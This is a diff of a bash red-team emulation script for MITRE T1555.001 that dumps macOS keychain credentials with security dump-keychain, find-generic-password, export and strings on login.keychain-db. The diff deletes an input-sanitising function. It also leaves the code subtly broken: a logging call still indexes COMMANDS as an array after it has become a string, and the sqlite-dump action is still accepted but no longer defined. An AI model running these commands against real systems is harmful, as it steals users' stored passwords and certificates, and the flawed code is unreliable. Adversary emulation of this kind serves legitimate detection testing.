@@ -12,6 +12,7 @@
 # References:
 # - https://attack.mitre.org/techniques/T1555/001/
 # - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md
+# - 
 
 
 
@@ -56,19 +57,17 @@ SERVER=""
 OUTPUT_FILE=""
 
 # Use an array for storing commands
-declare -A COMMANDS
-COMMANDS[dump_keychain]='security dump-keychain login.keychain'
-COMMANDS[find_generic]='security find-generic-password -a "$ACCOUNT" -s "$SERVICE"'
-COMMANDS[find_internet]='security find-internet-password -a "$ACCOUNT" -s "$SERVER"'
-COMMANDS[find_cert]='security find-certificate -a -p'
-COMMANDS[unlock_keychain]='security unlock-keychain login.keychain'
-COMMANDS[export_items]='security export -k login.keychain -t certs -f pem -o "$OUTPUT_FILE"'
-COMMANDS[find_identity]='security find-identity -v -p codesigning'
-COMMANDS[strings_keychain]='strings ~/Library/Keychains/login.keychain-db'
-COMMANDS[sqlite_dump]='sqlite3 ~/Library/Keychains/login.keychain-db .dump'
+COMMANDS="
+dump_keychain:security dump-keychain login.keychain
+find_generic:security find-generic-password -a \"\$ACCOUNT\" -s \"\$SERVICE\"
+find_internet:security find-internet-password -a \"\$ACCOUNT\" -s \"\$SERVER\"
+find_cert:security find-certificate -a -p
+unlock_keychain:security unlock-keychain login.keychain
+export_items:security export -k login.keychain -t certs -f pem -o \"\$OUTPUT_FILE\"
+find_identity:security find-identity -v -p codesigning
+strings_keychain:strings ~/Library/Keychains/login.keychain-db
+"
 
-# Arrays to store checks
-CHECKS=()
 
 #FunctionType: utility
 display_help() {
@@ -125,7 +124,7 @@ log_to_stdout() {
 }
 
 #FunctionType: utility
-setup_log() {
+create_log() {
     local script_name=$(basename "$0" .sh)
     touch "$LOG_FILE"
 }
@@ -136,7 +135,7 @@ log_output() {
     local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
     
     if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
-        setup_log
+        create_log
     fi
     
     echo "$output" >> "$LOG_FILE"
@@ -144,7 +143,7 @@ log_output() {
     # Rotate log if it exceeds 5MB
     if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
         mv "$LOG_FILE" "${LOG_FILE}.old"
-        setup_log
+        create_log
     fi
 }
 
@@ -254,16 +253,11 @@ validate_input() {
     return 0
 }
 
-#FunctionType: utility
-sanitize_input() {
-    local input="$1"
-    echo "$input" | sed 's/[;&|]//g'
-}
 
 #FunctionType: utility
 execute_command() {
     local cmd_key="$1"
-    local cmd="${COMMANDS[$cmd_key]}"
+    local cmd=$(echo "$COMMANDS" | awk -F: -v key="$cmd_key" '$1 == key {print $2}')
     
     if [ -z "$cmd" ]; then
         echo "Unknown command: $cmd_key" >&2
@@ -364,20 +358,20 @@ validate_permissions() {
 
 #FunctionType: attackScript
 execute_ttp() {
-    local action_type="$1"
+    local input_cmd_arg="$1"
     local output=""
 
-    if ! validate_input "$action_type"; then
+    if ! validate_input "$input_cmd_arg"; then
         return 1
     fi
 
-    case "$action_type" in
+    case "$input_cmd_arg" in
         "dump-keychain"|"find-generic"|"find-internet"|"find-cert"|"unlock-keychain"|"export-items"|"find-identity"|"strings-keychain"|"sqlite-dump")
-            log_to_stdout "Attempting to $action_type" "execute_ttp" "${COMMANDS[${action_type//-/_}]}"
-            output+=$(execute_command "${action_type//-/_}")
+            log_to_stdout "Attempting to $input_cmd_arg" "execute_ttp" "${COMMANDS[${input_cmd_arg//-/_}]}"
+            output+=$(execute_command "${input_cmd_arg//-/_}")
             ;;
         *)
-            output+="Unknown action type: $action_type\n"
+            output+="Unknown action type: $input_cmd_arg\n"
             ;;
     esac
 
@@ -440,15 +434,20 @@ main() {
     local output=""
     local separator=$'\n---\n'
 
-    if [ ${#CHECKS[@]} -gt 0 ]; then
-        for check in "${CHECKS[@]}"; do
-            output+="${separator}Executing TTP ($check):${separator}"
-            output+=$(execute_ttp "$check")
-        done
-    else
+    if [ $# -eq 0 ]; then
         display_help
         exit 0
     fi
+
+    # Process each argument
+    for arg in "$@"; do
+        case "$arg" in
+            --dump-keychain|--find-generic|--find-internet|--find-cert|--unlock-keychain|--export-items|--find-identity|--strings-keychain|--sqlite-dump)
+                output+="${separator}Executing TTP (${arg#--}):${separator}"
+                output+=$(execute_ttp "${arg#--}")
+                ;;
+        esac
+    done
 
     if [ -n "$output" ]; then
         if [ "$ENCODE" != "none" ]; then
